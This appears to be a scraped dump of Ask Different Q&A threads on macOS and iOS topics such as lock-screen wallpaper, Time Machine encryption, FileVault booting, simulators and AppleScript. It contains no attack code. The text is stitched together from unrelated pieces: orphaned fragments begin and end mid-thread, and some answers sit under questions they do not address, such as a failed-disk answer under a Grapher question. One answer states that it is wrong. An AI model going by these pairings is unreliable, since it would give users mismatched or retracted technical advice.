Following these steps to use my unblurred original wallpaper on the initial login screen of my Mac worked perfectly. Now I would like to do the same thing with the lock screen. While at work I have to lock the screen every time I step away from my desk. But I've never liked that my wallpaper is blurred while on the lock screen. I searched and searched but I couldn't find any instructions for getting rid of the blur effect on the lock screen, only for the login screen, which, as I've said, I've already done successfully.\nDoes anyone know if it's possible to remove the blur effect from the lock screen wallpaper?\n\nA: I found this article online, and I hope this helps. I just saw someone who had their lock screen be un-blurred, and I started researching it. So, I saw this and created an account on StackExchange to post this. I hope this helps. I am also new to StackExchange, so if the answer could be changed for the better please let me know so I can change it.\nHere is the link\nIf you’d rather your login screen not be blurred, you can do that too! I recommend first adding a custom image to your desktop so that there is an image in so that there is an image in the /Library/Caches folder.Then, copy that image to your desktop by dragging it there.\n\nWe’ll use this image in a little bit. First, open whatever image you’d like to show up behind your login screen with Preview. Select the entire canvas (Command+A), then copy it (Command+C).\n\nNext, head to your desktop and open the file you copied from /Library/Caches. Paste (Command+V) what you just copied.\n\nYou will need to move and resize what you’re pasting quite a bit in order to get everything just right. When you’re done, save the image (Command+S). Head back to your desktop, and drag your edited image to the /Library/Caches folder. You will be asked if you’d like to replace the file that’s there; click “Replace.”\n\nYou’ve now placed your custom background image. Go ahead and log out of your user account to see how it looks:\n\nIt worked! In my case, however, the white maple leaf is making it hard to read the white text used by macOS. To fix this, I found a different version of this image where the leaf is blue.\n\nMuch better! This version puts the darker part of the image behind the text, which makes it easier to read everything. You’ll probably have to experiment with this a little yourself, but to avoid problems favor dark images over light ones, and simple images over complex ones.\nIf you’re a Photoshop guru, you might prefer making an image yourself over messing around with Preview in this way. You can do that, but the image you create needs to meet specific criteria. It must be:\n\n\n*\n\n*A PNG file\n\n*The same exact resolution as your primary display\n\n*RGB, sRGB, or Adobe RGB color mode.\n\n*8bit colors\n\n*Unlocked background layer\n\n*Named “com.apple.desktop.admin.png”\nIn our tests, even doing all these things can still be hit-or-miss, so we suggest using the Preview method. It’s just simpler.\n\n", "Q: Use F1, F2 etc. keys to control built-in Mac features when using an external USB keyboard I use a generic external USB keyboard (specifically Amazon Basics Wired Keyboard) with my MacBook Pro. The keyboard doesn't include the fn key present on MacBook's built-in keyboard.\nOn the external keyboard, I wish for F1, F2 etc. keys to function just like built-in keyboards default configuration, i.e. to control Mac features like adjusting brightness, Mission Control, Launchpad etc. and not work as plain function keys.\nHow do I configure the external keyboard to do that? I would much prefer for a solution built into macOS rather than relying on a 3rd party app.\nI am using a late 2013 15\" MacBook Pro running macOS High Sierra 10.13.6.\n\nA: The fn key isn't a modifier that's sent to the OS, it modifies the scan code that is sent.\nTo test this out, you can use a built in utility called xev (requires X11) to view the scan codes being sent from your mouse and keyboard.  You can also use Karabiner's Event Viewer to to obtain the key press scan codes.\nWhat this means is that the scan code for F1 (130) will be different from the scan code of fnF1 (107).  Keep in mind that macOS allows you to \"lock\" the fn key to a particular behavior (have the function keys act as normal function keys or act as the \"special feature keys\").\nThis is different from other modifier keys (like Shift or Option in that both scan codes are sent (i.e. Shift A sends 64 and 8).\nAs for remapping a keyboard, you can use the built in utility hidutil to remap keys.  This answer here can guide you on how to do that.\n\n\n*\n\n*Apple Developer Documentation Key Table Usage\n\n*USB.org Key Usage Table Reference (Page 53) (more in-depth source for Apple's Table)\n\n\nThis is a bit of a workaround for a simple keyboard, and my preference would be to just purchase a cheap keyboard with the fn key functionality built in so everything works out of the box.\n\nA: No chance. \nto use the function keys on the Mac you'll need an Apple keyboard.\nI had the same problem at one of my customers Mac.\nEdit: This information is wrong.

It also presents a nice simple GUI to re-partition your HD/SSD.\nIf you are comfortable installing the necessary drivers (at least keyboard and trackpad/mouse) into a bootable Windows 10 installer then I say, \"Go for it.\"\nBut I do Windows support for a living and I don't bother with that and frankly don't know HOW to do that.

I wish to use Remote Desktop Protocol on my Windows 10 machine to remotely access my MacBook Air running macOS High Sierra.\nIs this possible in any way shape or form?\n\nA: Remote access over RDP is possible from macOS to Windows but not vice versa.\nYou can instead configure Screen Sharing from within Sharing preference pane under System Preferences app and connect to the Mac from Windows using one of the many VNC client apps.\n\n", "Q: Installing Ubuntu Virtual Machine on macOS using Native Hypervisor? I have Mac Book Pro running macOS High Sierra (10.13.5). I want to run Ubuntu in a virtual machine so that I can ultimately run it as a Kubernetes node.\nI realise I could use a Type-2 / Hosted Hypervisor such as Virtual Box to do this. I was just wondering if there was a Type-1 / Native one I could use for OS X? In other words what is the Hyper-V equivalent for OS X? And is this possible or do I just use Virtual Box and be done with it?\n\nA: The easiest way to run an Ubuntu virtual machine on macOS is probably to use multipass.\n\nMultipass can launch and run virtual machines and configure them with cloud-init like a public cloud.\n\nLaunching the current Ubuntu LTS is as easy as\nmultipass launch --name foo\n\nMultipass is based on HyperKit (a toolkit for embedding hypervisor capabilities in applications) which is itself based on xhyve (a port of the BSD bhyve hypervisor to macOS) which itself use the Apple Hypervisor framework.\nTechnically all these hypervisors are type 2 because they run on macOS contrary to type 1 hypervisors which would run on bare metal.\n", "Q: Encrypt backups on encrypted APFS drive for Time Machine backup? I have a 1 TB internal drive (with APFS file system and FileVault enabled) I want to backup using Time Machine to an external USB hard drive. I want the backup itself encrypted so no one who has the hard drive can read/restore its content without a password.\nShould I format the Time Machine partition as APFS or APFS (encrypted)?\nShould I select \"Encrypt backups\" option when creating the Time Machine or should I even do both?\nI called Apple and they told me to do both but the call center agent did not really make the impression that he knows for sure.\n\n\nA: The simplest setup is to just connect any disk to the Mac and if you don't have Time Machine set up, you will be automatically prompted to use that drive and if it needs reformatting, that is explained. Then once the backups are set, if you are backing up an encrypted Mac to an unencrypted destination, Time Machine automatically prompts to encrypt the drive.\n\nIf you like doing things manually, here's more details and explanation that you want an HFS based drive to hold the backup whether you start from APFS or HFS.\nUp until OSX Big Sur (11.0), you could not use an external disk with APFS for a time machine backup. You had to use Journaled HFS+. To do so, first, format your external disk as JHFS+ (Encrypted). After that, go to Settings > Time Machine and select your disk. If you have the option, select \"Encrypt Backup\". This way, your backup will be encrypted. So the answer to your question is neither of them. It is Journaled HFS+ (Encrypted). Under these older versions of OSX, if you try to use APFS with Time Machine, you'll get the following warning:\n\nSource: Apple - Backup disks you can use with Time Machine (APFS isn't mentioned at all)\nUpdate: 24.12.2020\nmacOS Big Sur 11.0+ (including Monterey)\n\nAPFS or APFS Encrypted disks are the preferred format for a Time Machine backup disk. If you select a new backup disk that’s not already formatted as an APFS disk, you get the option to erase and reformat it. If the disk is a Mac OS Extended format disk that contains an existing Time Machine backup, you aren’t asked to erase and reformat the disk.\n\nSource: macOS User Guide: Types of disks you can use with Time Machine on Mac\n", "Q: How to hide/show a specific icon on Mac OS X Desktop I have managed to write a piece of code in .profile file in bash to hide/show all the icons from the Desktop, running from Terminal.\nI need the same functionality just for 1 icon to work with after I have hidden all in the first place.\nSo I need something like showicon %1 command, where %1 is the name of the icon on Desktop.\nAny Suggestions on how do I do it?\n\nA: The Terminal command chflags can be used to hide and unhide files:\n    chflags hidden /path/to/file.ext\n\nor\n    chflags nohidden /path/to/file.ext\n\nYou can create a simple alias called hideicon that invokes chflags hidden, and similarly for showicon to invoke the opposite command:\n    alias hideicon='chflags hidden'\n\nand\n    alias showicon='chflags nohidden'\n\nAdd these to your ~/.bashrc file, and they'll load with each new instance of your shell.\n", "Q: Preferences changes using \"defaults\" not applied I'm a CLI enthusiast and, as such, I've been a extensive user of brew, cask, m, mas, softwareupdate and so on.

What is the problem here?\n\nA: If you have already tried clicking and dragging on a row/column header without any success, it might be because a cell in in the row/column you are trying to drag has been merged with a row or column which you aren't dragging (note: this cell may be hidden, and it still will not work). This will cause clicking and dragging to fail (without any feedback to hint that it is failing because of that reason).\nThis might have been why you were unable to switch rows.\n", "Q: How can I enter safe mode with the built in keyboard broken? Recently I noticed that my mac’s storage is almost full. It showed that “System” took up more than 200 GB. I thought that was ridiculous and googled for a bit.\nI found that one solution is to boot my mac in safe mode. Apparently after booting in safe mode “System” will take up a sensible amount of storage.\nThe problem is, the built in keyboard on my mac is broken (the power button is still ok). I once took it to an Apple Store and they said that one of the wires/connector thingys disconnected or something like that.\nSo I connected a wireless keyboard via USB (in case you don’t know what I’m talking about, I plug a little USB stick into my mac and the keyboard talks to that via infrared or something like that) and tried to press the shift key with that keyboard.\nHowever, safe mode just won’t boot this way. The progress bar always stuck at 100% and it just wouldn’t show the login screen. I later learned that apparently you can’t boot in safe mode when accessories are connected.\nSo how can I boot my mac in safe mode?\nNote that these options are not available:\n\n\n*\n\n*fixing my mac’s built-in keyboard\n\n*buying a new mac\n\n\n\nSide note: I do a lot of iOS development on my mac and uses git for all my projects (20+ repos). For the developers out there, is it true that those files take up a lot of space and are classified as “System”?\n\n\nA: Although this might be either a layered problem or an XY-Problem:\nThere are a few things to consider here.\n\n\n*\n\n*The broken keyboard.    \n\n\n*\n\n*Using a directly USB-connected wired keyboard should work. This registers boot key combinations.\n\n*Using a directly connected wireless bluetooth keyboard – like a Magic Keyboard from Apple – should work, but it is a little bit finickier. If not done before the situation arose, it might be difficult to pair the Bluetooth keyboard with the Mac though.\n\n*A Bluetooth dongle should not work. the dongle is likely not properly operational in the crucial time frame (this  seems to be the current approach so far.)\nIn all cases it might be a good idea to disconnect all other peripherals anyway.\n\n\n*The exact problem with the internal keyboard is hard to see from the information given. But if it is indeed \"one of the wires/connector thingys disconnected or something like that\" then it might be worth a shot to open the MacBook and reseat the connector (although that seems bizarre as this would have been quite an easy fix for the AppleStore to apply). Nevertheless, if you cannot insist on the Store to do that for you, and if you cannot resist to do that by yourself: ifixit Step 33 shows the – from your description – most crucial part (be careful and read the entire guide at least three times before taken up a screwdriver for the first time.)\n\n\n*The non-booting Mac with \"storage is almost full\"\nSafeMode is only so powerful: \n\nApple: What is safe mode?\n  Safe mode (sometimes called safe boot) is a way to start up your Mac so that it performs certain checks and prevents some software from automatically loading or opening. Starting your Mac in safe mode does the following:\n  \n  \n*\n  \n*Verifies your startup disk and attempts to repair directory issues, if needed\n  \n  \n*\n  \n*Loads only required kernel extensions\n  Prevents startup items and login items from opening automatically\n  \n*Disables user-installed fonts   \n  \n*Deletes font caches, kernel cache, and other system cache files\n  \n  \n  The gains from deleting the caches are sometimes substantial. But SafeMode is no magic bullet either.\n  \n\nIf the keyboard solutions above fail you might try to boot from another drive (you didn't indicate whether just Shift doesn't work or Option is defunct as well). When booted from another drive you might have much more control and higher gains in accessing your drive and delete some stuff on it.\nIn older Macs with more standard interfaces for the SSD it might be an option to remove the internal SSD and put it into an external enclosure, and then boot from yet another drive. that other drive should be picked up automatically even if nothing is selected or selectable, if it is bootable at all.\nConclusion\nTry a wired USB keyboard. Any one. Shift should be a universal \nconstant across all models.\n", "Q: NTLM hash function in Terminal?

Good day everyone, I have a 15\" MacBook Pro Mid 2010. It's working well with the current hard drive (El Capitan). However when we swapped in our SSD (High Sierra) and booted, it gave the blinking folder which means that it can't find an OS to boot from.\nI reset the laptop and held down the alt/option key. I then saw two options, an \"EFI Boot\" and our SSD. I was able to boot from our SSD and everything is working well.\nHowever, this presents an inconvenience, it would be quite the hassle to reset the laptop and remember to hold down the alt/option key to be able to make the laptop boot properly.\nWhen I looked up updates for our MacBook Pro model, the updates I found were dated way back 2010/2012, and I don't think these are the updates I'm looking for.\nOne solution we're looking at is to get a blank SSD, install El Capitan or until Sierra (whichever is available), and then upgrade to High Sierra.

I'd be immensely grateful if someone helped me get the last screen unlocks (such as by going to the Apple menu > lock screen).

I guess this is registered in some log file or there's some Terminal command to get this.\nI guess this must be possible because, when you use parental controls and you set up a time limit for a user, if the user locks the screen, the time on lock screen doesn't seem to count against the allowed time, which seems to imply that lock screens are registered in some log file??\nThe following is in a screenshot of an excerpt from the terminal output after running the High Sierra code listed in @JBis's answer:\n\n\nA: MacOS Catalina has a log format different from Mojave.

How can the kernel be encrypted? A standard pitfall of disk encryption on Linux is needing /boot unencrypted. Specifically the bootloader and initrd. Encrypting the entire disk means putting those somewhere else, e.g. on a USB stick.\nedit: I have now learned that grub can now decrypt a filesystem containing the kernel at boot so it's only the bootloader that needs to be unencrypted under Linux\nI am under the impression that it's \"known\" that FileVault implements whole disk encryption. I certainly believed this was the case. This is slightly difficult to demonstrate without a bunch of links to external sites. A couple of internal ones:\nbrute-force-on-whole-disk-encryption and \nwhole-disk-encryption-with-a-windows-only-bootcamp\nAnd an existing question that answers essentially this question\nis-file-vault-2-whole-disk-encryption-or-whole-partition-encryption\nIt seems fairly clear that file vault works at partition granularity and that Apple uses a separate boot partition. I can't find any evidence to suggest that file vault can be used on the boot partition.\nI don't understand how it can boot so far as to offer a login prompt if the whole disk is encrypted. What am I missing?\nFor reference, the system I'm interested in is using apfs rather than cs and does not have a T2 chip.\n\nA: At the most basic level, Apple controls the firmware and stores the absolute minimum information needed to present the illusion that an OS is running at the pre-boot log in screen when FileVault is enabled.\nThis is documented quite extensively by Apple:\n\n\n*\n\n*https://support.apple.com/en-us/HT201159 - Product security certifications, validations, and guidance for macOS\n\n*https://support.apple.com/en-us/HT204837 - Use FileVault to encrypt the startup disk on your Mac\n\n*https://support.apple.com/en-us/HT208862 - Mac Computers that have the T2 chip\n\n\nPrior to the T2 chip which serves as a sort of trusted module to authenticate if the OS being booted is properly signed / encrypted and/or not tampered with, this pre-boot information can be stored in NVRAM as well as the EFI / recovery HD which don’t get encrypted with a key that needs a user password/passphrase to unlock the main storage.\nWhen you change the background or users that are allowed to unlock FileVault - this cached data is saved outside the encrypted portion of the disk so we are presented with the icons and graphical log in screen. When I see Apple say the startup disk is encrypted, I take that to mean the Macintosh HD logical volume only which stores all user data and all OS but not the firmware and pre-boot data. (except for the T2 chip enabled hardware which are special cases and not the norm yet)\nYou can confirm this with either commend below based on whether your OS supports APFS and APFS containers which is the new standard for volumes and encryption or HFS+ and Core Storage containers.\ndiskutil cs list\ndiskutil apfs list\n\nThe other exciting change that’s in progress relating to the T2 chip on the new MacBook Pro and the iMac Pro is that it can enforce encryption to the internal storage whether or not anyone takes the second step of FileVault encryption. Specifically, it will generate an encryption key and start encrypting all data before the user account is even created. An SSD from any of these will not be readable if taken to another computer whether that computer has a T2 chip or not.

Here's how to do it:\n$ xcrun simctl list\n\nSample output:\n(...)\n== Devices ==\n-- iOS 12.2 --\n    iPhone X (AC5DA9BB-2198-4E6B-9CFC-A407730FF853) (Shutdown) \n    iPhone Xs (69A34565-5621-419C-8F37-3089FEFA52C1) (Shutdown) \n    iPhone Xs Max (8192F2B2-3F3F-49C1-AC36-D88550D48FCA) (Shutdown) \n(...)\n\nThe string in braces is UUID of the simulator device.\nBoot the device with:\n$ xcrun simctl boot $UUID\n\nNow launch the simulator with:\n$ open /Applications/Xcode.app/Contents/Developer/Applications/Simulator.app/\n\nIf you do not need to switch the Simulator type, just run the last command.\nMore info about simctl and how to use it see the NSHipster article.\n\nA: You can specify the device the simulator should run with using the --simulator flag, followed by the device name as a string. \nIn my case, I do: react-native run-ios --simulator=\"iPhone 6s\"\n\nA: Here's one way (with two variations) to do what you want:\nBegin by using Terminal to open the iOS Simulator.app's enclosing folder:\ncd /Applications/Xcode.app/Contents/Developer/Applications/; open .\nNow you need to make a choice. If you use the Simulator often enough to keep its icon in the Dock, then go ahead and drag it in. If not, your other choice right click on the app's icon and select Make Alias, then drag the alias into the \"Applications\" directory.\nAll done in twenty seconds, and welcome to Ask Different!\n", "Q: How to find the URLs accessed by iOS Apps? Sometimes I need to find the URLs that are accessed by iOS apps to block their Internet connection. In a web browser, I can get the URLs directly from the address panel. But how can I get the URLs accessed by apps?  \n\nA: You could use the Adblock app which is cheaper than Charles Proxy($2 vs $9) and is really easy to setup.\nIt has a local DNS proxy which can log all domains your device is connecting to and can also block domains or route them to different ones.\n\n\nA: There is a wonderful app for that which I recommend (as a happy customer) and it’s called Charles Proxy.\n\n\n*\n\n*https://www.charlesproxy.com/documentation/ios/\nYou would install that on the iPhone and then connect to the proxy app as the VPN service which would then intercept all the calls and log them for you. This is far easier than paying for an external VPN and external DNS service and logging all the requests off the device. It also is much faster in my experience than offloading the inspection and logging to a remote computer.\nI don’t leave the proxy on all the time, just when I need to see what’s happening, then I turn it off when I review the logs. I’m sure there are other options and look forward to other answers if there are better options than Charles Proxy.\nIf you have a network you control, look into a DNS service like pi-hole which can log all the lookups as well and make it easy to block ones you find objectionable. \n\n\n*\n\n*https://pi-hole.net/\n", "Q: How to disconnect MacBook Pro 15 2017 battery?

I'm looking at changing to a Family Shared iCloud plan, and want to know if it's possible to protect folders in the iCloud. \nSo, for example, so I can put files like Home Insurance documents in there, that the Parents can see but not the Children.\n\nA: My understanding is that each AppleID cannot see the other files and the only thing shared is the total capacity of each item that is stored in each siloed storage.\nIf you are giving the children access to the Mac or iPad where you are storing these files, you’ll need to encrypt them separately (Disk Utility allows encrypted disk images - kind of like a secure USB drive that only mounts when you put in the proper passphrase) or set those devices to lock and not allow the children in unsupervised.\nThen you can explicitly share only the files you want with the several AppleID that belong to “the Parents” on a one-off basis.\n", "Q: Is there a way to temporarily enlarge the mouse pointer like Apple's \"Shake to find\" does? I'm aware of Apple's \"Shake to find\" feature, which enlarges the pointer (too briefly for me), and I occasionally use it.\nI'm also aware of (increasingly unstable and out-of-date) third-party programs like \"Mouse Locator\" and Mouseposé, both of which suffer from lack of upgrades to keep up with Mac OS versions.\nI'm looking for a way to trigger the temporary big cursor effect of \"Shake to find\" without shaking the mouse - as I want to keep the cursor near the thing I want to highlight.\n\nA: There is way to increase the size of your cursor, but it will stay that size until you change it again. Maybe making the cursor a little bigger will help?\nGo to System Preferences and click Accessibility. Then on the left click on Display. Click on the subsection called \"Cursor\", then use the slider to set the cursor size. You can also turn off the feature where your cursor expands when you shake it by unchecking the box.\n\nA: You're looking in the wronn direction. The \"Shake to Find\" feature is used when you cannot find your mouse pointer. It is not intended to be used when you can locate the mouse pointer, but want to make others aware of its location. \nIn the comments you wrote that you specifically want this feature for making others aware of your mouse pointer location when screen sharing and similar. There's no way of making that feature do what you want.\nLuckily, multiple utility apps exist for precisely this purpose:\nYou can go to the App Store and buy \"Cursor Pro\" by IXEAU UG, which works as a mouse pointer highlighter and magnifier when pressing a hot key.\nAnother alternative is the app \"Mouseposé\" from Boinx Software, which adds a spot light to your mouse pointer. It can also do other stuff such as adding an animation when you click the mouse. I haven't had any issues with stability with this program in its latest version.\nA cheaper alternative is \"myPoint Light S\" from Code Race on the App Store, which allows you to add a visual effect to the mouse pointer by pressing a hot key.\nAnother alternative is the free program \"Highlighter\" which permanently adds a ring around your mouse pointer.\nAnother free program is \"Mouse Locator\" from 2point5fish, which allows you to trigger a sniper like graphics with a hot key. This app doesn't seem to be updated anymore, though - so even though it is free, it might not be worth the extra effort.\n", "Q: How to customize new Siri voice in the Speech of Accessibility? Siri has a peppy new voice.  And I want to use this voice to help me read selected texts. However, I don't know how to set it. Why can't we use the new Siri voice?\nSystem Preferences --> Accessibility --> Speech --> System Voice --> Customize \n\nThis is my Siri setting:\n\n\nA: The answer is simple--but I think you may not like it. Siri's voice can be selected for text-to-speech only on iOS devices. The reason you do not see it listed among your MacBook's System Voice choices is that Siri's voice is not available as a System Voice on MacOS. On Apple's computers, Siri will be heard only in its role as the Siri personal assistant. You need to use a iPhone or an iPad to have Siri speak selected text.\n\nA: The peppy new voice you're referring to is really just the existing voice that has been improved via the use of deep learning so that it has a smoother more natural sound than previously.\nThis is not something you have to select. Apple started introducing these changes as part of iOS upgrades, starting with iOS 10 and continuing with iOS 11. These changes have also been deployed to macOS and in fact with multiple languages (not just English!)\nIf you're interested, you can refer to Siri On-Device Deep Learning-Guided Unit Selection Text-to-Speech System. This is, however, a rather technical article.\nIn summary, there is nothing for you to do to get the benefits of this peppy new voice. \n[UPDATE]\nJust to clarify, there is no new voice option to get the benefit of Siri's improvements. That is, it's not a new voice, it just that Siri's voices have been (and continue to be) improved so that they have a smoother more natural sound. \nTo quote directly from Apple:\n\nFor iOS 11, we chose a new female voice talent with the goal of improving the naturalness, personality, and expressivity of Siri’s voice. We evaluated hundreds of candidates before choosing the best one. Then, we recorded over 20 hours of speech and built a new TTS voice using the new deep learning based TTS technology. As a result, the new US English Siri voice sounds better than ever.\n\nSource: Deep Learning for Siri’s Voice: On-device Deep Mixture Density Networks for Hybrid Unit Selection Synthesis\nFor ease of reference, below are some audible examples you can listen to to compare how Siri's female English voice has changed over time. In each example you will hear the phrase spoken three times by Siri to compare how she sounds from iOS 9 to iOS 10 to iOS 11. \nExample 1\n“Okay, I set up your meeting with David tomorrow. Shall I schedule it?\"\nExample 2\n“Always close the barn door tight.”\n", "Q: Why is my Mac sharing the macintosh disk, and home folder? I just installed an Ubuntu 18.04 on my desktop and decided to try connecting each other (my MacBook Pro) via SMB.\nTo my surprise, when I connected to my Mac, using my Ubuntu desktop, the Macintosh (the disk itself), and the home folder, along with the public folder is completely accessible.\nThe problem is, aside from enabling the SMB file sharing on my MacBook Pro, I have not added anything to allow for file sharing, aside from the public folder, which is the only entry on the file sharing settings.\nHow do I prevent access from the disk, and the home folder?\n\nA: You can remove all the default shares easily from the system preferences. Search for sharing and then configure (by selecting and then pressing the - ) to remove each share you don’t want to be active.\nThen you can leave sharing on and just add the specific shares you want.\nHere is an article with a picture showing what you would select and then use the + - control below the shared folder to remove that specific share.\n\n\n*\n\n*https://support.apple.com/en-us/HT204445\nIf you granted more permissions editing the config file and didn’t save a backup copy, you can recover an unmodified  version of that from back up or from the installer / recovery HD as well.\n", "Q: Delete specific Time Machine backup via GUI I would like to delete specific Time Machine backups, but not the oldest backup (which Time Machine will do automatically) but one in the middle. Simply dragging it (i.e., a folder such as for example /Backups.backupdb/computername/2018-06-20-041012) to the trash used to work, however, on recent systems it will result in one no longer being able to fully empty the Trash with the drive connected as you'll get the annoying \"operation cannot be completed because Macintosh HD is in use\" message, see here for discussion. \nSo, how to properly delete middle backups? This appears to be the correct method via the command line. \nYet, elsewhere (see answer by Glenn Leblanc) it is suggested that the correct method via user interface is by entering Time Machine, navigating to the Backups.backup/computername/ directory and using the context menu \"Delete all backups of ...\" to delete the backup.  Can anyone confirm if that is indeed the case?  \nBecause the contextual \"Delete all backups of ...\"  menu item is usually used in Time Machine to delete all backups of a particular item (such as a particular large file), which I understand as deleting that item from all backups (which can be useful to free up space). Now if this is true then \"Delete all backups of 2018-06-20-041012\", for example, would mean \"delete all versions of all files backed up on that day\" ... which would remove all backups of that machine (except for newly changed/added files after that date. \nOr is it that the same command behaves differently when applied to a particular file within a backup as opposed to a full backup folder? Could any of the Time Machine wizards here explain how this is supposed to be working?  \n\nA: To delete a specific backup enter Time Machine by selecting that option from the time machine icon in the menu bar. Once inside Time Machine, there will be a stack of windows. Click on the up arrow to the right of the window stack. This will start leafing thru the stack of backups with the dates shown in the top section of the windows. Run thru the stack until you get to the backup you want to remove. With the window for this backup at the front of the stack, click on the icon that looks like a gear located in the top part of the window below the date. One option that appears is to delete the backup. Choose that selection to delete that specific backup.\n", "Q: What can I do when the power button does not put the macbook to sleep?

I tried opening the trash and right-clicking on the folder and choosing \"Delete Immediately\" but it still gives me the message that folder can't be deleted.  I'm running High Sierra 10.13.5 on an iMac.\n\nA: Of course the problem only shows when I want to empty my trash and my related Time Machine volume is mounted. When I want to delete my trash, I temporarily unmount the TM Volume. And from now on I will not try to make extra room on my other TM back-up volumes by deleting folders from my Time Machine back-up. I will either let Time Machine automatically delete what is needed when the volume is full, or manually delete data using a method built into the Time Machine software.\n", "Q: Labeling axes on Grapher?

Either it is physically disconnected or the more likely answer: dead. I would suggest you bring it into a local Apple Store. The Geniuses will be able to tell you the issue for free. You can decide if you would like to pay to have the disk replaced (assuming death is correct) or to get a new Mac entirely.\nEither way you shouldn't lose too much data because you have been making consistent backups very often, right?\n\nA: One way to boot the computer to macOS would be to connect a USB 3.0 external drive (HDD/SSD) to the iMac. Boot to internet recovery and install macOS on the external drive. (You may need to first run the Disk Utility to create a Mac OS Extended (Journaled) or APFS volume.) Once the iMac is up and running, you can open the System Information application and view the status of the internal SATA/SATA Express hardware. \nThe most likely cause of your problem would be the failure of the internal drive. You could continue to use the iMac using the external drive or replace the internal drive. An example video of the replacement procedure can be found at this OWC website.\nOften, it is possible to put a internal drive in a USB 3.0 shell which can be externally connected to the iMac. If the internal drive needs to be replaced, you then exchange the bad drive with the drive in the shell.\nIf you decide to use a external drive, you may want to consider a thunderbolt SSD drive. These types of drives will give you the maximum performance. \n\nA: Your harddisk or solid state disk is missing. Either the disk is damaged or the connection is damaged. This is almost always a hardware problem. Replacing the cable and/or drive does not have to be expensive and might be worth the repair effort.\n", "Q: How to download macOS High Sierra from the Mojave App Store? I use the beta of macOS Mojave and I want to download High Sierra for another install.\nI don't find it in the new App Store, maybe because the update of the OS is now in the System Preferences.\nI try the link from the online version: https://itunes.apple.com/us/app/macos-high-sierra/id1246284741?mt=12 but the Download button is disabled.\nAny idea to download it?\n\nA: I would elaborate each of the steps given below, but this would be difficult without knowing more about your current partitioning and the model/year of your Mac.\n\n\n*\n\n*Shrink the partition containing Mojava and add a new jhfs+ partition. \n\n*Boot to internet recovery and install the version of macOS that came with your Mac.\n\n*If necessary, upgrade the current macOS.\n\n*Download High Sierra from the App Store.\n\n*(Optional) Remove the new partition and reclaim the free space.\n\nA: In previous versions of the beta this was not possible.  But in the latest release (as of 9/15/18) it is possible to use direct links to open the download page.\nThis links can be found on Apple's How To Download pages.\nHere are the direct links for a some of them:\n\n*\n\n*Big Sur\n\n\n*Catalina\n\n\n*Mojave\n\n\n*High Sierra\n\n\n*Sierra\n\n\n*El Capitan\n\n\n*Yosemite\nAll other OS can be purchased from Apple directly and are not in the App Store.\n\nA: The erase and install process is always an option since the recovery HD will offer to download the latest shipping OS. You could always connect an external USB drive and boot to internet recovery and install a shipping OS to the external - leaving Mojave running on the main storage. Then you'll have a shipping version of the OS to download the installer if that's really what you need instead of just a quick wipe and reinstall.\n\nA: Apple doesn't let you download an OS that's earlier than the one you have on your mac. You need a mac running High Sierra or older to be able to download from the app store.\n", "Q: Do I need to upgrade iOS before creating backup to be restored onto new iPhone? Do I need to upgrade iOS before creating backup to be restored onto a new iPhone?\nI have an iPhone 7 running iOS 10 and would like to upgrade to iPhone X.\niPhone X ships with iOS 11 and I'm looking for the proper way to transfer data when the new phone arrives.\nDo I need to upgrade the older iPhone first to iOS 11 before creating a backup to be restored onto iPhone X?\n\nA: No - you should probably always backup before any upgrade just in case the upgrade fails. I would get a backup as soon as you can in general as well as in specific when you are about to move or upgrade.\nThe good thing about your situation is the iPhone X and iOS 11 setup assistant will remind you to make a backup of the old device and even let you start the setup and wait for the other backup to complete.\nGetting a backup now is good since backups to iCloud and backups to iTunes tend to be incremental so they save several backups and the next backup will just need to save changed data and often completes very quickly.\nThe only time you might consider upgrading is if you have a really old version of iOS and skipped several major versions. I do like always updating right before a transfer since sometimes minor updates fix issues with setup so you can skip those bugs by updating everything after you have a good foundation backup.\n", "Q: Run backup script at any time every weekend (using launchd?)

I have an iPad 2 running iOS 9.3.  I have many files on Pages app.  The app locks up and will not fully load all the files.  If I delete and reinstall will I lose my files?\n\nA: If they are stored in iCloud Drive or another remote storage thing they will be redownloaded when you re-setup Pages. If they are not in a Cloud storage thing, they will be deleted with the app.\nSince iOS 9 is a bit old at this point, newer iOS have a files app and you should be able to store all your Pages and iWork documents in file storage as opposed to storing them in the application bundle to avoid deleting any documents when you remove the Pages app.\n", "Q: Contact recently upgraded to iPhone. How can I tell my iPhone to send them iMessages now? One of my contacts has recently switched to an iPhone.

Since it's a folder you're specifying, the HFS path ought to have an ending colon, which you've omitted.  This would actually lead to another error when you concatenate it with the file name.  In fact, you needn't use HFS paths at all when providing a path to the location where the attachment is to be saved.  A POSIX path string is entirely acceptable, and actually preferable.  So, it would look like this:\n    set attachmentsFolder to \"/Users/John/Dropbox/John & Julie/Wirecard/\"\n    set savePath to the attachmentsFolder & (the name of theAttachment)\n    save theAttachment in POSIX file savePath\n\nI'd also say that the try...end try is unnecessary, and hindering: if there was an error in the save command (which there will be as it currently stands, given the omitted colon in the path string), it would go unnoticed and your attachment simply wouldn't get saved, but you'd have no idea why until you remove the try...end try enclosure.\nBut the reason you don't actually need it is because there's no reason to silence the errors at this point in the script.  It's the very last command, so if the script terminates due to an error, it doesn't matter.  Typically, the try block would be useful if there were more commands to follow afterwards, and you didn't want the failure to save the attachment to prevent the rest of the script from executing.\nImplementing these changes would result in this as a revised script:\n    using terms from application \"Mail\"\n        on perform mail action with messages theMessages for rule theRule\n            set attachmentsFolder to \"/Users/John/Dropbox/John & Julie/Wirecard/\"\n            tell application \"Mail\"\n                set savePath to the attachmentsFolder & the name of theAttachment\n\n                with timeout of 1800 seconds -- 30 minutes!\n                    save theAttachment in POSIX file savePath\n                end timeout\n            end tell\n        end perform mail action with messages\n    end using terms from\n\n(Although you still need to define the theAttachment variable.)\n", "Q: Embedding AppleScript inside a Bash -- getting Error I'm fiddling with bash for the first time and trying to get something simple to work.\n#!/bin/bash\n    while true ; do\n    osascript <<EOF\n        tell application \"System Events\"\n            tell every desktop\n                set picture to \"/Users/bill/Desktop/bckg_changer/ARM_1885.jpg\"\n            end tell\n        end tell\n    EOF\ndone\n\nWhen I execute this file from the command line, it throws:\nBills-iMac-4:test bill$ ./test.sh\n./test.sh: line 11: syntax error: unexpected end of file\n\nI found this question, and the formatting and structure is similar - so not sure what is missing.\nThe picture changing script itself works - it's when I add the while loop that the end of file error is thrown.\nCaveat\nI know this script doesn't make sense - the idea was to have a continuous loop, that would revert the desktop picture to the jpg if it was subsequently changed in the System Preferences.

By that I mean scale it down. I can find how to crop the image, but that’s not what I want.\nFor example, I have a large image, say 1280px x 960px. I would like to scale it to a smaller size, say 640px x 480px.

